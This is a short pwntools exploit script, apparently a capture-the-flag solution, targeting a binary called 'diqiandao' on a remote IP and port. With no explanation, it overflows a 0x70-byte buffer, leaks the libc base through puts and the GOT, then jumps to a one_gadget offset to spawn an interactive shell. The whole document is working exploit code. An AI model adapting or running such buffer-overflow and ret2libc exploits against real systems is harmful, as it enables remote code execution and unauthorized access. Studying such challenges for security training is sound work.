from pwn import *
context.log_level = 'debug'
#p = process('./diqiandao')
p = remote('120.27.3.220', 10010)
e = ELF('./diqiandao')
junk = 'a'*0x70
ppp_ret = 0x080486fd
p_ret = 0x080486ff
payload = junk
p.recv()
payload += p32(e.plt['puts'])+p32(0x08048618)+p32(e.got['puts'])
p.sendline(payload)
libc = u32(p.recv(4)) - 0x5F140
# system = libc + 0x03a940
print hex(libc)
# binsh = libc+0x15902b
one_gadget = libc+0x11DC3F
p.recvuntil('!?')
p.sendline('a'*(0x70-8)+p32(one_gadget))
p.interactive()
